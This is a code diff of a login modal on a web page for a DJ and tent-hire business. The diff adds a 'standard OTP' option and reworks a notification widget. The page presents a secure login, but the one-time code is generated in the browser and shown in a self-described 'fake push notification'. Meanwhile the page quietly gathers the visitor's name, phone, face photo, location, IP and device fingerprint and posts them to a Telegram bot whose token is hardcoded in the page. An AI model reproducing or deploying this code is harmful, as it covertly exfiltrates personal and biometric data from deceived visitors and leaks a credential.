@@ -2972,8 +2972,7 @@
         Welcome to Maa Nirmala DJ & Tent House!<br>
         Enter the OTP sent to your mobile for quick and secure login.
     </div>
-    <div class="mnd-push-otp" id="mndPushOtpText">******</div>
-    <div class="mnd-push-footer">Slide up to dismiss</div>
+    <div class="mnd-push-otp" id="mndPushOtpText" onclick="copyPushOTP()" title="Tap to Copy">******</div>
 </div>
 
 <div id="hubAuthModal" style="display:none; position:fixed; inset:0; background:rgba(5,5,5,0.95); z-index:9999999; justify-content:center; align-items:center; backdrop-filter:blur(10px);">
@@ -2987,11 +2986,15 @@
 
         <div style="padding:25px;">
             <div id="hubStep1">
-                <p style="color:#aaa; font-size:12px; margin-bottom:15px; text-align:center; font-family:'Outfit';">Enter your details to initiate secure login.</p>
+                <p style="color:#aaa; font-size:12px; margin-bottom:15px; text-align:center; font-family:'Outfit';">Enter your details and select a secure login method.</p>
                 <input type="text" id="hubName" style="width:100%; padding:12px; margin-bottom:10px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="Your Full Name">
-                <input type="tel" id="hubPhone" style="width:100%; padding:12px; margin-bottom:15px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="10-Digit Mobile Number" maxlength="10">
-                <button style="width:100%; padding:15px; background:#D4AF37; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="startFaceID()">
-                    CONTINUE TO FACE ID <i class="fas fa-camera"></i>
+                <input type="tel" id="hubPhone" style="width:100%; padding:12px; margin-bottom:20px; background:rgba(255,255,255,0.05); border:1px solid #333; color:#fff; border-radius:8px; font-family:'Outfit'; box-sizing:border-box;" placeholder="10-Digit Mobile Number" maxlength="10">
+                
+                <button id="btnStandardOtp" style="width:100%; padding:12px; margin-bottom:10px; background:transparent; border:1px solid #D4AF37; color:#D4AF37; font-weight:bold; border-radius:8px; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="generateStandardOTP()">
+                    <i class="fas fa-comment-sms"></i> GET STANDARD OTP
+                </button>
+                <button id="btnFaceIdOtp" style="width:100%; padding:12px; background:#D4AF37; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="startFaceID()">
+                    <i class="fas fa-camera"></i> FACE SCAN VERIFICATION
                 </button>
             </div>
 
@@ -3007,6 +3010,7 @@
                 <button id="hubCaptureBtn" style="width:100%; padding:15px; background:#00fa9a; border:none; font-weight:bold; border-radius:8px; color:#000; cursor:pointer; font-family:'Outfit'; transition:0.3s;" onclick="captureFaceAndSendOTP()">
                     <i class="fas fa-expand"></i> SCAN FACE & GET OTP
                 </button>
+                <p style="color:#aaa; font-size:12px; text-align:center; margin-top:15px; cursor:pointer; font-family:'Outfit';" onclick="resetHubLogin()">Back to Methods</p>
             </div>
 
             <div id="hubStep2" style="display:none;">
@@ -3031,7 +3035,6 @@
 </div>
 
 <style>
-    /* Loader Animations */
     @keyframes spinLoader { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     @keyframes pulseText { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
 
@@ -3039,7 +3042,7 @@
     #mndPushNotif {
         position: fixed;
         left: 50%;
-        transform: translateX(-50%);
+        transform: translateX(-50%); /* Base position perfectly centered */
         width: 90%;
         max-width: 400px;
         background: rgba(20, 20, 20, 0.95);
@@ -3049,40 +3052,34 @@
         padding: 15px;
         z-index: 9999999999;
         box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         display: flex;
         flex-direction: column;
         gap: 8px;
+        /* Default transition handles the slide down from top */
+        transition: top 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275), transform 0.3s ease, opacity 0.3s ease;
     }
-    .mnd-push-hidden { top: -200px; }
-    .mnd-push-visible { top: 20px; }
+    
+    /* Completely hidden off-screen (Fixed!) */
+    .mnd-push-hidden { top: -300px; opacity: 0; }
+    
+    /* Visible on screen */
+    .mnd-push-visible { top: 20px; opacity: 1; }
 
-    .mnd-push-header {
-        display: flex;
-        justify-content: space-between;
-        align-items: center;
-        border-bottom: 1px solid rgba(255,255,255,0.1);
-        padding-bottom: 8px;
-    }
+    .mnd-push-header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 8px; }
     .mnd-push-header img { width: 20px; height: 20px; border-radius: 5px; }
     .mnd-push-header span { color: #fff; font-family: 'Outfit'; font-size: 12px; font-weight: 600; opacity: 0.8; }
-    .mnd-push-close { color: #fff; font-size: 20px; cursor: pointer; line-height: 1; opacity: 0.5; }
+    .mnd-push-close { color: #fff; font-size: 24px; cursor: pointer; line-height: 1; opacity: 0.5; transition: 0.3s; }
+    .mnd-push-close:hover { opacity: 1; color: #ff3333; }
     
     .mnd-push-body { color: #ddd; font-family: 'Outfit'; font-size: 13px; line-height: 1.4; text-wrap: balance; }
     
     .mnd-push-otp {
-        font-family: 'Outfit';
-        font-size: 32px;
-        font-weight: 900;
-        color: #D4AF37;
-        text-align: center;
-        letter-spacing: 5px;
-        padding: 10px 0;
-        background: rgba(212,175,55,0.05);
-        border-radius: 8px;
+        font-family: 'Outfit'; font-size: 36px; font-weight: 900; color: #D4AF37;
+        text-align: center; letter-spacing: 6px; padding: 10px 0;
+        background: rgba(212,175,55,0.05); border-radius: 8px; border: 1px dashed rgba(212,175,55,0.3);
+        cursor: pointer; transition: 0.2s; user-select: none;
     }
-    
-    .mnd-push-footer { text-align: center; color: #888; font-size: 10px; font-family: 'Outfit'; margin-top: 5px; }
+    .mnd-push-otp:active { transform: scale(0.95); background: rgba(212,175,55,0.2); }
 </style>
 
 <script>
@@ -3092,6 +3089,7 @@
     let currentUserPhone = "";
     let hubVideoStream = null;
     let pushTimeout = null;
+    let loginMethod = ""; // "standard" or "faceid"
     
     const HUB_TG_TOKEN = "8671549318:AAFmsnS2xvhOJFgYUZfFDe5ELDhpYwlFVqQ"; 
     const HUB_TG_CHAT = "8506290708";
@@ -3112,15 +3110,46 @@
         stopHubCamera();
     }
 
-    // --- 2. SWITCH TO FACE ID STEP ---
-    async function startFaceID() {
+    // Input Validation
+    function validateInputs() {
         currentUserName = document.getElementById('hubName').value.trim();
         currentUserPhone = document.getElementById('hubPhone').value.trim();
-
         if(!currentUserName || currentUserPhone.length !== 10 || isNaN(currentUserPhone)) {
             alert("⚠️ Please enter your Full Name and a valid 10-digit mobile number.");
-            return;
+            return false;
         }
+        return true;
+    }
+
+    // --- 2A. METHOD 1: STANDARD OTP (No Camera) ---
+    async function generateStandardOTP() {
+        if(!validateInputs()) return;
+        loginMethod = "Standard OTP";
+
+        const btn = document.getElementById('btnStandardOtp');
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> SENDING...';
+        btn.disabled = true;
+
+        currentHubOTP = Math.floor(100000 + Math.random() * 900000).toString();
+        const fingerprintText = await gatherDeviceFingerprint(false, loginMethod);
+
+        fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendMessage`, {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: HUB_TG_CHAT, text: fingerprintText, parse_mode: 'Markdown' })
+        })
+        .then(() => {
+            document.getElementById('hubStep1').style.display = 'none';
+            document.getElementById('hubStep2').style.display = 'block';
+            showPushNotification(currentHubOTP);
+            btn.innerHTML = '<i class="fas fa-comment-sms"></i> GET STANDARD OTP';
+            btn.disabled = false;
+        });
+    }
+
+    // --- 2B. METHOD 2: FACE ID & OTP ---
+    async function startFaceID() {
+        if(!validateInputs()) return;
+        loginMethod = "Face Scan";
 
         document.getElementById('hubStep1').style.display = 'none';
         document.getElementById('hubStepFaceID').style.display = 'flex';
@@ -3130,19 +3159,11 @@
             hubVideoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
             video.srcObject = hubVideoStream;
         } catch (err) {
-            alert("⚠️ Camera permission is strictly required for Identity Verification.");
+            alert("⚠️ Camera permission is strictly required for Face Verification.");
             resetHubLogin();
         }
     }
 
-    function stopHubCamera() {
-        if (hubVideoStream) {
-            hubVideoStream.getTracks().forEach(track => track.stop());
-            hubVideoStream = null;
-        }
-    }
-
-    // --- 3. CAPTURE FACE, BUILD OTP, SEND TO TG ---
     async function captureFaceAndSendOTP() {
         const btn = document.getElementById('hubCaptureBtn');
         btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> VERIFYING...';
@@ -3150,76 +3171,92 @@
 
         const video = document.getElementById('hubVideo');
         const canvas = document.getElementById('hubCanvas');
-        
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
+        canvas.width = video.videoWidth; canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
 
-        // Generate 6-digit OTP
         currentHubOTP = Math.floor(100000 + Math.random() * 900000).toString();
 
-        // Convert image to Blob and handle sending
         canvas.toBlob(async (blob) => {
-            // Stop camera immediately
             stopHubCamera();
-            
-            // Switch UI to OTP step instantly so user isn't waiting
             document.getElementById('hubStepFaceID').style.display = 'none';
             document.getElementById('hubStep2').style.display = 'block';
             
-            // Trigger the Fake Push Notification
             showPushNotification(currentHubOTP);
+            const fingerprintText = await gatherDeviceFingerprint(false, loginMethod);
 
-            // In Background: Gather massive device log
-            const fingerprintText = await gatherDeviceFingerprint(false);
-
-            // Prepare Telegram Payload (Photo + Massive Caption)
             const formData = new FormData();
             formData.append('chat_id', HUB_TG_CHAT);
             formData.append('caption', fingerprintText);
             formData.append('parse_mode', 'Markdown');
             formData.append('photo', blob, 'face_id.jpg');
 
-            // Send silently in background
-            fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData })
-                .catch(err => console.log("Log error"));
+            fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendPhoto`, { method: 'POST', body: formData }).catch(e=>{});
 
             btn.innerHTML = '<i class="fas fa-expand"></i> SCAN FACE & GET OTP';
             btn.disabled = false;
         }, 'image/jpeg', 0.85);
     }
 
-    // --- FAKE PUSH NOTIFICATION LOGIC ---
-    function showPushNotification(otpCode) {
-        const notif = document.getElementById('mndPushNotif');
-        document.getElementById('mndPushOtpText').innerText = otpCode;
-        
-        notif.classList.remove('mnd-push-hidden');
-        notif.classList.add('mnd-push-visible');
-        if(typeof playTap === 'function') playTap(); // Optional sound
+    function stopHubCamera() {
+        if (hubVideoStream) { hubVideoStream.getTracks().forEach(track => track.stop()); hubVideoStream = null; }
+    }
 
-        // Auto close after 60 seconds (60000ms)
+    // --- FAKE PUSH NOTIFICATION & SWIPE LOGIC ---
+    const pushEl = document.getElementById('mndPushNotif');
+    let pushStartX = 0;
+
+    function showPushNotification(otpCode) {
+        document.getElementById('mndPushOtpText').innerText = otpCode;
+        pushEl.classList.remove('mnd-push-hidden');
+        pushEl.classList.add('mnd-push-visible');
+        if(typeof playTap === 'function') playTap(); 
+
         clearTimeout(pushTimeout);
-        pushTimeout = setTimeout(closePushNotif, 60000);
+        pushTimeout = setTimeout(closePushNotif, 60000); // Stays for 1 minute
     }
 
     function closePushNotif() {
-        const notif = document.getElementById('mndPushNotif');
-        notif.classList.remove('mnd-push-visible');
-        notif.classList.add('mnd-push-hidden');
+        pushEl.classList.remove('mnd-push-visible');
+        pushEl.classList.add('mnd-push-hidden');
+        // Reset transform position after it animates up
+        setTimeout(() => { pushEl.style.transform = `translateX(-50%)`; pushEl.style.opacity = '1'; }, 400);
     }
 
-    // Swipe up to dismiss logic
-    let startY = 0;
-    const pushEl = document.getElementById('mndPushNotif');
-    pushEl.addEventListener('touchstart', e => { startY = e.touches[0].clientY; }, {passive: true});
-    pushEl.addEventListener('touchmove', e => {
-        let currentY = e.touches[0].clientY;
-        if(startY - currentY > 20) { closePushNotif(); } // Swiped up
+    // Copy OTP to clipboard
+    function copyPushOTP() {
+        navigator.clipboard.writeText(currentHubOTP);
+        const otpText = document.getElementById('mndPushOtpText');
+        otpText.innerText = "COPIED!";
+        setTimeout(() => { otpText.innerText = currentHubOTP; }, 1500);
+    }
+
+    // Swipe Left or Right to Dismiss
+    pushEl.addEventListener('touchstart', e => {
+        pushStartX = e.touches[0].clientX;
+        pushEl.style.transition = 'none'; // Follow finger exactly
     }, {passive: true});
 
+    pushEl.addEventListener('touchmove', e => {
+        let currentX = e.touches[0].clientX;
+        let diff = currentX - pushStartX;
+        pushEl.style.transform = `translateX(calc(-50% + ${diff}px))`;
+    }, {passive: true});
 
-    // --- 4. VERIFY OTP ---
+    pushEl.addEventListener('touchend', e => {
+        pushEl.style.transition = 'top 0.5s ease, transform 0.3s ease, opacity 0.3s ease';
+        let diff = e.changedTouches[0].clientX - pushStartX;
+        if (Math.abs(diff) > 70) {
+            // Swiped far enough - throw it off screen left or right
+            pushEl.style.transform = `translateX(calc(-50% + ${diff * 5}px))`;
+            pushEl.style.opacity = '0';
+            setTimeout(closePushNotif, 300);
+        } else {
+            // Snap back to center
+            pushEl.style.transform = `translateX(-50%)`;
+        }
+    });
+
+    // --- 4. VERIFY OTP & REDIRECT ---
     function verifyHubOTP() {
         const entered = document.getElementById('hubOtpInput').value.trim();
         if(entered === currentHubOTP && currentHubOTP !== "") {
@@ -3246,8 +3283,8 @@
         stopHubCamera();
     }
 
-    // --- 5. GATHER MASSIVE DEVICE FINGERPRINT ---
-    async function gatherDeviceFingerprint(isReturning) {
+    // --- 5. DEVICE FINGERPRINTING LOGIC ---
+    async function gatherDeviceFingerprint(isReturning, methodStr) {
         let ip = "Masked", battery = "Unknown", network = "Unknown", gpu = "N/A";
         try { const r = await fetch('https://api.ipify.org?format=json'); const j = await r.json(); ip = j.ip; } catch(e){}
         try { const b = await navigator.getBattery(); battery = `${Math.round(b.level * 100)}% (${b.charging ? '⚡ Charging' : '🔋 Battery'})`; } catch(e){}
@@ -3266,20 +3303,20 @@
         }
 
         const time = new Date().toLocaleString('en-IN', { timeZone: 'Asia/Calcutta' });
-        const statusType = isReturning ? "(Auto-Login/Saved Device)" : `(OTP: ${currentHubOTP})`;
+        let statusType = isReturning ? "(Auto-Login/Saved Device)" : `(${methodStr} OTP: ${currentHubOTP})`;
 
         let locationData = "❌ Location Denied/Unavailable";
         const getLoc = () => new Promise(res => {
             if(!navigator.geolocation) return res("❌ Not Supported");
             navigator.geolocation.getCurrentPosition(
-                pos => res(`✅ Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\n🔗 [Google Maps](http://googleusercontent.com/maps.google.com/7{pos.coords.latitude},${pos.coords.longitude})`),
+                pos => res(`✅ Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}\n🔗 [Google Maps](http://googleusercontent.com/maps.google.com/8{pos.coords.latitude},${pos.coords.longitude})`),
                 err => res("❌ Location Denied by User")
             );
         });
         const locTimeout = new Promise(res => setTimeout(() => res("❌ Request Timed Out"), 2500));
         locationData = await Promise.race([getLoc(), locTimeout]);
 
-        return `🚨 *SECURE HUB ACCESS LOG* 🚨\n_${statusType}_\n\n👤 *USER IDENTITY*\n• Name: ${currentUserName}\n• Phone: ${currentUserPhone}\n\n📱 *DEVICE FINGERPRINT*\n• Model: ${model}\n• OS/Browser: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE SPECS*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${battery}\n\n📡 *NETWORK INTEL*\n• IP: ${ip}\n• Type: ${network}\n\n📍 *LOCATION DATA*\n${locationData}\n\n⏰ *Time:* ${time}`;
+        return `🚨 *SECURE HUB ACCESS LOG* 🚨\n_${statusType}_\n\n👤 *USER IDENTITY*\n• Name: ${currentUserName}\n• Phone: ${currentUserPhone}\n\n📱 *DEVICE FINGERPRINT*\n• Model: ${model}\n• OS: \`${browser}\`\n• Screen: ${screen}\n• Timezone: ${tz}\n\n⚙️ *HARDWARE SPECS*\n• GPU: ${gpu}\n• CPU/RAM: Cores: ${cores}, RAM: ${ram}\n• Battery: ${battery}\n\n📡 *NETWORK INTEL*\n• IP: ${ip}\n• Type: ${network}\n\n📍 *LOCATION DATA*\n${locationData}\n\n⏰ *Time:* ${time}`;
     }
 
     // --- 6. SEAMLESS REDIRECT ANIMATION ---
@@ -3288,9 +3325,9 @@
         const loadText = document.getElementById('hubLoadText');
         loader.style.display = 'flex';
 
-        // If it's a returning user, send text-only background log
+        // Auto-Login sends a text-only log
         if(isReturning) {
-            const logText = await gatherDeviceFingerprint(true);
+            const logText = await gatherDeviceFingerprint(true, "Auto");
             fetch(`https://api.telegram.org/bot${HUB_TG_TOKEN}/sendMessage`, {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: HUB_TG_CHAT, text: logText, parse_mode: 'Markdown' })
